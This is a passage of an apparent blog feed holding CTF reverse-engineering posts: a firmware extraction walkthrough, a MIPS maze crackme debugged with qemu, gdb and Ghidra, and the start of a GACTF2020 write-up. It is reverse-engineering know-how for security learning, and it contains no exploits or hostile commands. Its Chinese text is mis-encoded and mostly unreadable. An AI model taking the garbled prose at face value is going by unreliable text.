class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AFX_MSGMAP</span>&#123;</span></span><br><span class="line">    AFX_MSGMAP * pBaseMessageMap;</span><br><span class="line">    AFX_MSGMAP_ENTRY * lpEntries;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AFX_MSGMAP_ENTRY</span>&#123;</span></span><br><span class="line">    UINT nMessage;    <span class="comment">//Windows Message</span></span><br><span class="line">    UINT nCode        <span class="comment">//Control code or WM_NOTIFY code</span></span><br><span class="line">    UINT nID;         <span class="comment">//control ID (or 0 for windows messages)</span></span><br><span class="line">    UINT nLastID;     <span class="comment">//used for entries specifying a range of control id's</span></span><br><span class="line">    UINT nSig;        <span class="comment">//signature type(action) or pointer to message </span></span><br><span class="line">    AFX_PMSG pfn;     <span class="comment">//routine to call (or specical value)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ä»ä¸€é“CTFé¢˜ç®€å•æ¥è§¦è·¯ç”±å™¨é€†å‘</title>
      <link href="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/"/>
      <url>/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å…³é”®é‡åˆ°ä¸€ä¸ªç”±äºGlibcç‰ˆæœ¬å˜åŒ–å‡ºç°çš„é—®é¢˜ï¼ŒèŠ±äº†äº›æ—¶é—´è§£å†³ã€‚ã€‚<a id="more"></a></p></blockquote><p>é¦–å…ˆæ˜¯å¯¹è·¯ç”±å™¨æ–‡ä»¶ç³»ç»Ÿçš„å­¦ä¹ ï¼Œçœ‹äº†ä¸€ç¯‡æ–‡ç« ï¼Œè¿™é‡Œç›´æ¥è´´ä¸Šï¼š<a href="https://www.cnblogs.com/blacksunny/p/7208451.html" target="_blank" rel="noopener">è·¯ç”±å™¨æ–‡ä»¶ç³»ç»Ÿä¸æå–</a></p><p>ç„¶åè¿™ä¸ªCTFé¢˜æ¥è‡ªBUUï¼š<strong>firmware</strong></p><p>ä¸‹è½½åå¾—åˆ°ä¸€ä¸ªbinæ–‡ä»¶ï¼Œfileä¸€ä¸‹ï¼š<img src="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/image-20201004180937146.png" alt="image-20201004180937146"></p><p>ä»æœ€ä¸Šé¢çš„æ–‡ç« å¯ä»¥çŸ¥é“è¿™æ˜¯å›ºä»¶é‡Œçš„binæ–‡ä»¶åˆ†æã€‚</p><p>é¦–å…ˆä½¿ç”¨binwalk æå–å‡ºï¼Œå¾—åˆ°ä¸€ä¸ªSquashfs æ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶ï¼š<img src="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/image-20201004181455157.png" alt="image-20201004181455157"></p><p>å¯¹äºSquashfs æ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶ï¼Œæˆ‘ä»¬è¦ä½¿ç”¨firmware-mod-kitå·¥å…·æ¥è¿›è¡Œè§£å‹ã€‚<a href="https://blog.csdn.net/ldwj2016/article/details/80712566" target="_blank" rel="noopener">fiemware-mod-kitå·¥å…·çš„å®‰è£…</a></p><p>é‡åˆ°çš„é—®é¢˜æ¥äº†ã€‚è·Ÿç€å®‰è£…å‰ç½®çš„æ–‡ä»¶åï¼Œåœ¨<strong>æ‰§è¡Œconfigureæ–‡ä»¶ç”ŸæˆMakefileæ–‡ä»¶ç„¶åmakeç¼–è¯‘ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶</strong>å‘ç”Ÿäº†é—®é¢˜ï¼š<img src="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/image-20201004182128948.png" alt="image-20201004182128948"></p><p>å…¶å®ä¸Šé¢çš„ä¹Ÿæœ‰å¾ˆå¤šwarningï¼Œä½†éƒ½èƒ½é€šè¿‡çš„ï¼Œæ‰¾äº†ä¸€ç¯‡æ–‡ç« äº†è§£åŸå› ï¼Œ<a href="https://blog.csdn.net/baidu_35679960/article/details/78984497" target="_blank" rel="noopener">Cè¯­è¨€ä¸­å‡½æ•°ä¸å£°æ˜ä¹Ÿèƒ½ä½¿ç”¨</a></p><blockquote><p><strong>åœ¨å‡½æ•°å£°æ˜æ–¹é¢Cå’ŒC++åˆ™ä¸åŒï¼ŒC++è¯­è¨€ä¸­ï¼Œåœ¨è¢«è°ƒç”¨ä¹‹å‰æœªå£°æ˜æˆ–å®šä¹‰æ˜¯ä¸å…è®¸çš„ï¼Œè€ŒCè¯­è¨€æ˜¯å…è®¸çš„ã€‚</strong></p></blockquote><p>ç„¶åå°±æ˜¯å‡ºç°errorçš„åŸå› å¯»æ‰¾ã€‚ã€‚</p><p>æœ€å¼€å§‹æ²¡ä»”ç»†çœ‹å‡ºé”™åŸå› ï¼Œç›´æ¥æŠŠä¸€å¤§æ®µé”™è¯¯googleå’Œç™¾åº¦ï¼Œä½†å‘ç°å¤§å®¶éƒ½æ²¡æœ‰å‡ºç°è¿™æ ·çš„é—®é¢˜ã€‚ã€‚æ‰¾äº†å¾ˆä¹…ã€‚ã€‚</p><p>ç„¶åå¼€å§‹ä»”ç»†çœ‹å‡ºé”™çš„åŸå› ï¼Œå³ä¸Šé¢ç”»çº¢çº¿çš„è¯­å¥ã€‚æœ€å¼€å§‹å¯¹<strong>collect2ï¼šerrorï¼šld return 1 exit status</strong>è¿›è¡Œäº†æœç´¢ã€‚æ‰¾åˆ°è§£é‡Šï¼š<img src="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/image-20201004182839147.png" alt="image-20201004182839147"></p><p>æ„æ€å°±æ˜¯ï¼šä¸Šé¢çš„undefined reference to â€” å¯¼è‡´å‡ºé”™ã€‚è€Œ<strong>undefined reference to â€”</strong> å‡ºé”™çš„åŸå› æ˜¯æˆ‘ä»¬åœ¨ç¨‹åºä¸­ä½¿ç”¨äº†æœªå®šä¹‰çš„å‡½æ•°ã€‚</p><p>ç°åœ¨erroråŸå› æ¸…æ™°å¤šäº†ï¼Œgoogleä¹Ÿæ›´ç›®æ ‡åŒ–äº†ã€‚ç„¶åæ‰¾åˆ°äº†æœ€ç»ˆåŸå› ï¼š<img src="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/image-20201004183233667.png" alt="image-20201004183233667"></p><p>æœ€åæ‰¾åˆ°æ‰€æœ‰è¦ç¼–è¯‘çš„æ–‡ä»¶æ·»åŠ ä¸Šï¼š<strong>#include &lt;sys/sysmacros.h&gt;</strong>å³å¯ã€‚</p><p>å‡†å¤‡å·¥ä½œå®Œæˆï¼Œå¼€å§‹å¯¹Squashfs æ–‡ä»¶ç³»ç»Ÿæ–‡ä»¶è§£å‹ï¼š</p><p>åœ¨firmware/firmware-mod-kitç›®å½•ä¸‹ï¼Œä½¿ç”¨<strong>./unsquashfs_all.sh éœ€è¦è§£å‹æ–‡ä»¶çš„ç›®å½•</strong>ï¼š<img src="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/image-20201004183726652.png" alt="image-20201004183726652"></p><p>æœ€ååœ¨è§£å‹å¾—åˆ°æ–‡ä»¶ç›®å½•ï¼š<strong>squashfs-root/tmp</strong>ä¸‹å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„backdoorç¨‹åºã€‚ç„¶åè„±å£³ï¼Œæ‰¾stringã€‚</p><p><strong>æœ¬æ–‡æ›´å¤šçš„æ˜¯å¯¹è‡ªå·±è§£å†³é—®é¢˜ä¸€æ­¥ä¸€æ­¥çš„è®°å½•ï¼Œä¹Ÿæ˜¯è·¯ç”±å™¨é€†å‘çš„ç®€å•å­¦ä¹ ã€‚</strong></p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>iot&amp;mipsç¨‹åºåŠ¨è°ƒ&amp;qemuå­¦ä¹ &amp;ghidra</title>
      <link href="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/"/>
      <url>/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å¾çˆ±å¸ˆå‚…å‘äº†ä¸€ç¯‡å…³äºmipsç¨‹åºçš„é€†å‘ï¼Œåˆšæ¥è§¦é€†å‘é‡åˆ°è¿‡ä½†éƒ½è·³è¿‡äº†ï¼Œè¿™æ¬¡é‡åˆ°æ­£å¥½è¶æ­¤å­¦ä¹ ä¸€ä¸‹ã€‚</p></blockquote><a id="more"></a><h2 id="qemuçš„äº†è§£ä¸ghidra"><a href="#qemuçš„äº†è§£ä¸ghidra" class="headerlink" title="qemuçš„äº†è§£ä¸ghidra"></a>qemuçš„äº†è§£ä¸ghidra</h2><p>ä»¥è¯¥å¸ˆå‚…å‘çš„ioté€†å‘é¢˜ç›®æ¥å­¦ä¹ ã€‚<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919100306144.png" alt="image-20200919100306144">ä¸‹è½½åæœ‰3ä¸ªæ–‡ä»¶ï¼Œå…¶ä¸­ä¸€ä¸ªæ˜¯æç¤ºï¼š</p><blockquote><p><strong>é¢˜ç›®è¿è¡Œå‘½ä»¤å¦‚ä¸‹:</strong><br><strong>sudo qemu-system-mipsel -M malta -hda openwrt-malta-le-root.ext4 -kernel openwrt-malta-le-vmlinux.elf -nographic -append â€œroot=/dev/sda console=tty50â€</strong> </p><p><strong>éœ€è¦åˆ†æçš„ç¨‹åºä¸º ./bin/maze</strong></p></blockquote><p>äº†è§£ä¸‹qemuï¼š</p><blockquote><p>Qemu  æ˜¯<strong>çº¯è½¯ä»¶å®ç°çš„è™šæ‹ŸåŒ–æ¨¡æ‹Ÿå™¨ï¼Œå‡ ä¹å¯ä»¥æ¨¡æ‹Ÿä»»ä½•ç¡¬ä»¶è®¾å¤‡</strong>ï¼Œæˆ‘ä»¬æœ€ç†Ÿæ‚‰çš„å°±æ˜¯èƒ½å¤Ÿæ¨¡æ‹Ÿä¸€å°èƒ½å¤Ÿç‹¬ç«‹è¿è¡Œæ“ä½œç³»ç»Ÿçš„è™šæ‹Ÿæœºï¼Œè™šæ‹Ÿæœºè®¤ä¸ºè‡ªå·±å’Œç¡¬ä»¶æ‰“äº¤é“ï¼Œä½†å…¶å®æ˜¯å’Œ Qemu æ¨¡æ‹Ÿå‡ºæ¥çš„ç¡¬ä»¶æ‰“äº¤é“ï¼ŒQemu å°†è¿™äº›æŒ‡ä»¤è½¬è¯‘ç»™çœŸæ­£çš„ç¡¬ä»¶ã€‚</p></blockquote><p>å…¶å®å°±æ˜¯qemuå¯ä»¥æ¨¡æ‹Ÿä¸€äº›å¯¹åº”ç¨‹åºéœ€è¦ç¯å¢ƒæ¥è®©æ‰§è¡Œå¯¹åº”çš„ç¨‹åºã€‚</p><p>ç»è¿‡ä¸€ç•ªç†è§£åï¼Œå…¶å®å°±æ˜¯ä½¿ç”¨qemuåˆ©ç”¨æ‰€ç»™çš„2ä¸ªæ–‡ä»¶æ¥æ¨¡æ‹Ÿopenwrtç³»ç»Ÿæ¥è¿è¡Œï¼Œæˆ‘ä»¬çŸ¥é“linuxçš„æ¯ä¸ªå‘½ä»¤éƒ½æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè€Œæˆ‘ä»¬è¦åˆ†æçš„mazeæ–‡ä»¶ä¹Ÿåœ¨è¯¥å‘½ä»¤æ–‡ä»¶å¤¹ä¸­ï¼ˆbinï¼‰ã€‚</p><p>ç”±äº.ext4æ–‡ä»¶æ˜¯å¯ä»¥ç›´æ¥è§£å‹çš„ï¼Œé¦–å…ˆå°†å…¶è§£å‹åå¾—åˆ°è¦åˆ†æçš„mazeæ–‡ä»¶ã€‚</p><p>æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶ä¿¡æ¯ï¼š32ä¸ºå°ç«¯mipsçš„åŠ¨æ€é“¾æ¥ç¨‹åºã€‚<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919001345047.png" alt="image-20200919001345047"></p><p>æ‰§è¡Œä¸€ä¸‹çœ‹ï¼Œå‘ç°ä¸èƒ½æ‰§è¡Œï¼Œå› ä¸ºè¿™ä¸ªmipsæ¡†æ¶çš„ï¼ŒæŸ¥èµ„æ–™æ‰çŸ¥é“å¯ä»¥ä½¿ç”¨qemuæ¥æ¨¡æ‹Ÿmipsç¯å¢ƒæ¥æ‰§è¡Œmipsç¨‹åºã€‚</p><p>é¢˜ç›®æœ‰æç¤ºçš„ï¼Œåœ¨ä¸Šé¢å‘Šè¯‰äº†æˆ‘ä»¬<strong>é¢˜ç›®è¿è¡Œå‘½ä»¤</strong>ï¼š</p><p>æ‰€ä»¥é¦–å…ˆæˆ‘ä»¬æ˜¯è¦å®‰è£…qemuçš„ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu-user</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›å…¥è¯¥æ¨¡æ‹Ÿçš„openwrtç³»ç»Ÿï¼Œç®€å•æ‰§è¡Œä¸€ä¸‹mazeç¨‹åºï¼Œå¯ä»¥çœ‹è§ï¼Œè¿˜å¯ä»¥è¿›è¡Œgdbè°ƒè¯•ã€‚<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200918235617145.png" alt="image-20200918235617145"></p><p>ç”±äºida7.5ä»¥ä¸‹ä¸”ä¸ä½¿ç”¨<code>retdec</code>æ’ä»¶æ˜¯ä¸èƒ½åç¼–è¯‘mipsæ¡†æ¶ç¨‹åºçš„ï¼ŒçŸ¥é“å¯ä»¥ä½¿ç”¨ghidraã€‚ä¸‹è½½åï¼Œæ‰¾äº†ä¸€ä¸ªæ•™ç¨‹å­¦ä¹ äº†ä¸‹ï¼Œ<a href="https://bbs.pediy.com/thread-251204.htm" target="_blank" rel="noopener">Ghidraä½¿ç”¨</a>ï¼Œå…¶å®å’Œidaä¹Ÿæ€»ä½“å·®ä¸å¤šï¼Œä¸Šæ‰‹ä¼šå¾ˆå¿«ï¼Œä½†æ²¡æœ‰idaé‚£ä¹ˆæ–¹ä¾¿ã€‚</p><p>ç”±äºä»¥å‰å­¦ä¹ javaå®‰è£…è¿‡jdkä¸”é…ç½®äº†ç¯å¢ƒå˜é‡ï¼Œä¸‹è½½è¯¥ç¨‹åºåå¯ä»¥ç›´æ¥ä½¿ç”¨å¾ˆæ–¹ä¾¿ã€‚è½½å…¥ç¨‹åºï¼š<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919002432181.png" alt="image-20200919002432181"></p><p>æ–‡ä»¶åéƒ½æ˜¯mazeï¼ˆè¿·å®«ï¼‰ï¼Œä¸”é€šè¿‡ä¼ªä»£ç å¯ä»¥å¾ˆå¿«çœ‹æ¸…ç¨‹åºæµç¨‹ï¼Œè¿™é“é¢˜ä¹Ÿæ˜¯mazeçš„è€å¥—è·¯äº†ï¼Œé¦–å…ˆç”Ÿæˆä¸€ä¸ªè¡¨ï¼Œç„¶åé€šè¿‡æŒ‡å®šå­—ç¬¦ï¼ˆU D L Rï¼‰æ§åˆ¶èµ°å‘ï¼Œåˆ°è¾¾ä¸€ä¸ªç›®çš„åœ°ã€‚</p><p>è¿™é‡Œå¯ä»¥é€šè¿‡ä¼ªä»£ç è®¡ç®—å‡ºè¯¥è¡¨ï¼Œä½†å¯ä»¥ç›´æ¥é€šè¿‡æ¨¡æ‹Ÿçš„openwrtç³»ç»Ÿgdbè°ƒè¯•ï¼Œå°±è°ƒè¯•å¥½äº†ã€‚<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919003129670.png" alt="image-20200919003129670"></p><p>ç„¶ådumpå‡ºæ•°æ®ï¼š<strong>dump binary memroy dump.txt 0x4110d0 0x411147</strong><img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919003201998.png" alt="image-20200919003201998"></p><p>Cè¯­è¨€æŒ‰15*8æ‰“å°ä¸€ä¸‹ï¼š</p><p><img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919003349559.png" alt="image-20200919003349559"></p><p>æœ€åèµ°ä¸€ä¸‹å¾—ç»“æœï¼šDDRDDLDDRRRRRDRDDDDDLLDDLLLUUULU<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919003440203.png" alt="image-20200919003440203"></p><h2 id="mipsç¨‹åºçš„idaåŠ¨è°ƒä¸gdbè°ƒè¯•"><a href="#mipsç¨‹åºçš„idaåŠ¨è°ƒä¸gdbè°ƒè¯•" class="headerlink" title="mipsç¨‹åºçš„idaåŠ¨è°ƒä¸gdbè°ƒè¯•"></a>mipsç¨‹åºçš„idaåŠ¨è°ƒä¸gdbè°ƒè¯•</h2><p>å½“ç„¶åˆ°è¿™é‡Œè‚¯å®šæ˜¯ä¸å¤Ÿçš„ï¼Œä¸‡ä¸€ç¨‹åºæ²¡æœ‰ç»™èƒ½èƒ½è®©è¯¥mipsç¨‹åºè¿è¡Œçš„æ–‡ä»¶ç³»ç»Ÿï¼Œé‚£æˆ‘ä»¬è¿˜æ˜¯è‡ªå·±æƒ³åŠæ³•è®©ç¨‹åºè¿è¡Œèµ·æ¥è¿›è€ŒåŠ¨è°ƒã€‚</p><p>åœ¨ä¸Šé¢ä¸ºäº†æ¨¡æ‹Ÿopenwrtç³»ç»Ÿè¿è¡Œï¼Œå·²ç»å®‰è£…äº†qemu-userã€‚è¿™æ—¶å€™é™æ€é“¾æ¥çš„mipsç¨‹åºæˆ‘ä»¬æ˜¯å¯ä»¥ç›´æ¥æ‰§è¡Œäº†ï¼Œä½†ä¸€èˆ¬çš„ç¨‹åºçš„ç¨‹åºéƒ½æ˜¯åŠ¨æ€é“¾æ¥çš„ï¼Œæˆ‘ä»¬åªè¦å®‰è£…å¥½<strong>å¯¹åº”çš„æ¶æ„ç¨‹åºçš„å…±äº«åº“</strong>å°±å¥½äº†ã€‚<a href="https://www.cnblogs.com/WangAoBo/p/debug-arm-mips-on-linux.html" target="_blank" rel="noopener">å­¦ä¹ å®‰è£…çš„æ–‡ç« </a></p><p>é¦–å…ˆæœç´¢ç›¸å…³åº“ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-cache search <span class="string">"libc6"</span> | grep mips</span><br></pre></td></tr></table></figure><p><img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919101836969.png" alt="image-20200919101836969"></p><p>è¿™é‡Œæˆ‘ä»¬å®‰è£…ç¨‹åºéœ€è¦çš„å°±è¡Œã€‚æˆ‘ä¸ºäº†ä»¥åæ–¹ä¾¿å°†64ä½ä¸32ä½çš„å¤§å°ç«¯mipsç¨‹åºçš„å…±äº«åº“éƒ½è£…äº†ï¼š<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919102119629.png" alt="image-20200919102119629"></p><p>ç„¶åè¿è¡ŒåŠ¨æ€é“¾æ¥çš„ç¨‹åºè¦ä½¿ç”¨å®Œæ•´çš„å‘½ä»¤ä¸”æŒ‡æ˜å…±äº«åº“è·¯å¾„ï¼š<strong>-L æŒ‡æ˜å…±äº«åº“è·¯å¾„</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -L /usr/mipsel-linux-gnu/ ./maze</span><br></pre></td></tr></table></figure><p>ä½†è¿™é“é¢˜çš„mazeå´è¿è¡Œä¸äº†ï¼Œæç¤ºï¼š<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919102554822.png" alt="image-20200919102554822"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œä»–æç¤º/bin/ld-musl-mipsel-sf.so.1ä¸å­˜åœ¨ã€‚è€Œè¿™æ˜¯ä¸€ä¸ªç»å¯¹è·¯å¾„ï¼Œè€Œé¢˜ç›®ç»™äº†æ–‡ä»¶ç³»ç»Ÿçš„ã€‚æ‰€ä»¥æ‰¾åˆ°ä¹‹å‰è§£å‹çš„.ext4æ–‡ä»¶ï¼Œæœç„¶æ‰/bin/ç›®å½•ä¸‹å‘ç°ld-musl-mips-sf.so.1ã€‚æ‰€ä»¥è¿™ä¸ªçš„mipsçš„ç¨‹åºåº”è¯¥æ˜¯æŒ‡å®šäº†å…±äº«åº“çš„è·¯å¾„äº†ï¼Œæˆ‘ä»¬å®‰è£…32ä½å°ç«¯å…±äº«åº“è‡ªç„¶ä¸è¡Œã€‚</p><p>æ‰€ä»¥æœ¬é¢˜çš„ç¨‹åºè¦åˆ©ç”¨æ‰€ç»™çš„å…±äº«åº“ï¼Œæ¥ä¸‹æ¥æŠŠlibæ–‡ä»¶å¤¹æ”¾åœ¨ä¸mazeåŒä¸€çº§çš„ç›®å½•ä¸‹ï¼Œç„¶åæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -L ./ ./maze</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯æŠ¥é”™ã€‚ã€‚ä½†è¿™æ¬¡æ˜¯å…±äº«åº“å­˜åœ¨äº†ã€‚ã€‚<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919103541134.png" alt="image-20200919103541134"></p><p>æœ€ååœ¨çœ‹å‘è¿™ä¸ªé¢˜çš„å¸ˆå‚…çš„å¸–å­é‡Œçœ‹åˆ°ä¸€ä¸ªæ–¹æ³•ï¼šä¹Ÿå°±æ˜¯æˆ‘ä¸Šé¢æ‰§è¡Œå¤±è´¥çš„è§£å†³åŠæ³•ã€‚</p><p>æ‰¾åˆ°/lib/ä¸‹çš„2ä¸ªæ–‡ä»¶ï¼š<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919104238399.png" alt="image-20200919104238399"></p><p>æˆ‘çš„ç†è§£æ˜¯åƒé“¾è¡¨ä¸€æ ·é€šè¿‡ä¸€ä¸ªæ–‡ä»¶æ‰¾åˆ°ä¸€ä¸ªæ–‡ä»¶ã€‚è¿™æ ·ä¼šå¯¼è‡´æˆ‘ä»¬åœ¨æ‰€ç»™ç³»ç»Ÿå¤–æ‰§è¡Œè¯¥ç¨‹åºï¼Œè§£æå¤±è´¥ã€‚è§£å†³åŠæ³•ï¼š</p><p>ç›´æ¥åˆ é™¤åŸæ–‡ä»¶ï¼Œå°†æ‰€æŒ‡çš„2ä¸ªæ–‡ä»¶ï¼Œé‡å‘½åä¸ºæŒ‡å‘ä»–ä»¬æ–‡ä»¶çš„åç§°ã€‚<strong>ä¹Ÿå°±æ˜¯ld-musl-mipsel-sf.so.1åˆ é™¤ï¼Œlibc.soé‡åä¸ºld-musl-mipsel-sf.so.1ï¼Œå¦å¤–ä¸€ä¸ªæ–‡ä»¶åŒç„¶çš„æ“ä½œã€‚</strong></p><p>ç„¶åæ‰§è¡ŒæˆåŠŸã€‚<strong>å½“ç„¶å¯¹äºç›´æ¥ç»™çš„ä¸€ä¸ªmipsç¨‹åºï¼Œæˆ‘ä»¬ç”¨æŒ‡å®šçš„qemuå‘½ä»¤å¹¶æŒ‡æ˜å…±äº«åº“å°±å¯ä»¥æ‰§è¡Œçš„äº†ã€‚è¦æ˜¯å…¶ä»–æ¶æ„çš„ç¨‹åºä½¿ç”¨ç›¸åº”çš„å‘½ä»¤å³å¯</strong></p><p>ä¸ºäº†è°ƒè¯•ï¼Œæˆ‘ä»¬æŒ‡å®šæŸä¸€ä¸ªç«¯å£å¼€ä¸€ä¸ªGDBè°ƒè¯•ï¼ˆ-g portï¼‰ã€‚</p><p>å› ä¸ºä»¥å‰idaåŠ¨è°ƒç«¯å£å·éƒ½æ˜¯23946ï¼Œè¿™é‡Œä¸ºäº†idaåŠ¨è°ƒæ–¹ä¾¿ä¹Ÿç”¨è¿™ä¸ªã€‚<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919105704723.png" alt="image-20200919105704723"></p><p>ç°åœ¨æˆ‘ä»¬å°±å¯ä»¥å¼€å§‹è°ƒè¯•äº†ï¼Œä½¿ç”¨gdbä¸idaéƒ½å¯ä»¥ã€‚</p><p>é¦–å…ˆgdbï¼š</p><ol><li>å®‰è£…<strong>apt-get install gdb-multiarch</strong></li><li><strong>gdb-multiarch -q ./bin/maze</strong></li><li><strong>set architecture mips</strong>ï¼ˆè®¾ç½®å¥½è°ƒè¯•ç¨‹åºçš„æ¶æ„ï¼‰</li><li><strong>set endian little</strong>ï¼ˆè®¾ç½®ç¨‹åºçš„å¤§å°ç«¯ï¼‰</li><li>è¿œç¨‹è¿æ¥è°ƒè¯•ç«¯å£ <strong>target remote :23946</strong>ï¼ˆæœ¬åœ°å¯ä»¥ä¸å†™ipï¼Œ127.0.0.1ï¼‰</li></ol><p>idaï¼šä¸ä¹‹å‰çš„idaçš„<strong>Remote linux debugger</strong>ç±»ä¼¼ã€‚<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919110620683.png" alt="image-20200919110620683"></p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>GACTF2020</title>
      <link href="/2020/08/30/GACTF2020/"/>
      <url>/2020/08/30/GACTF2020/</url>
      
        <content type="html"><![CDATA[<p>åšäº†2ä¸ªé€†å‘åŠæ‚é¡¹è¿˜æ˜¯æœ‰æ”¶è·ã€‚<a id="more"></a></p><h2 id="Reverseï¼š"><a href="#Reverseï¼š" class="headerlink" title="Reverseï¼š"></a>Reverseï¼š</h2><h3 id="WannaFlag"><a href="#WannaFlag" class="headerlink" title="WannaFlag"></a>WannaFlag</h3><p>æ‰“å¼€ç¨‹åºï¼Œç‚«é…·çš„ç•Œé¢å’ŒéŸ³ä¹ã€‚å…¶å®å°±æ˜¯ä¸€ä¸ªCrackeMeã€‚<img src="/2020/08/30/GACTF2020/image-20200913175304433.png" alt="image-20200913175304433"></p><p>è½½å…¥idaï¼Œç›´æ¥å®šä½åˆ°GetwindowTextæˆ–è€…GetDlgItemTextå‡½æ•°ã€‚<img src="/2020/08/30/GACTF2020/image-20200913174317321.png" alt="image-20200913174317321"></p><p>å…³é”®å°±æ˜¯é‚£ä¸ªå¤æ‚çš„ifè¯­å¥æ 